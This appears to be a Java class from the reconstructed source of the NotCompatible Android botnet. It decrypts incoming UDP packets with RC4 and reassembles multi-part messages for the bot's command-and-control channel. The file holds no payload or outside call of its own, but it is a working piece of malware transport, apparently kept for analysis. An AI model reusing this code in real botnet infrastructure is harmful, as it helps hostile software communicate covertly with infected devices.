package diff.notcompatible.c.bot.net.udp;

import diff.notcompatible.c.bot.crypto.RC4;
import diff.notcompatible.c.bot.net.udp.objects.UDPHeader;
import diff.notcompatible.c.bot.net.udp.objects.UDPQueryItem;
import diff.notcompatible.c.bot.objects.List;

public class UDPQuery {

    List list;
    protected UDPPoint owner;

    public UDPQuery(UDPPoint newowner) {
        owner = newowner;
        list = new List();
    }

    private UDPQueryItem getBySeq(int sq) {
        for (int i = 0; i < list.count; i++) {
            if (((UDPQueryItem) list.getObject(i)).seq == sq) {
                return (UDPQueryItem) list.getObject(i);
            }
        }

        return null;
    }

    public void fullSeq(UDPQueryItem item, byte[] data) {
        list.delete(item);
        owner.onReadySeq(data);
    }

    public void check() {
        long currentTime = System.currentTimeMillis();
        if (list.count != 0) {
            for (int i = 0; i < list.count; i++) {
                if ((((UDPQueryItem) list.getObject(i)).lastChangeTime + 6000) < currentTime) {
                    list.delete(list.getObject(i));
                }
            }
        }
    }

    public void postData(byte[] postData) {
        // Run through cipher
        byte[] data = new RC4(owner.rc4key).crypt(postData);

        // Open post if there is proper looking data
        if (data.length > 7) {
            byte[] headerData = new byte[7];
            byte[] dataToTransfer = new byte[(data.length - 7)];
            System.arraycopy(data, 0, headerData, 0, 7);
            System.arraycopy(data, 7, dataToTransfer, 0, data.length - 7);

            UDPHeader udpHeader = new UDPHeader();
            udpHeader.unpack(headerData);
            if (udpHeader.count == 1) {
                owner.onReadySeq(dataToTransfer);
            } else {
                UDPQueryItem item = getBySeq(udpHeader.sequence);
                if (item == null) {
                    item = new UDPQueryItem(this);
                    item.seq = udpHeader.sequence;
                    item.totalCount = udpHeader.count;
                    list.add(item);
                }
                item.put(udpHeader.part, dataToTransfer);
            }
        }
    }
}
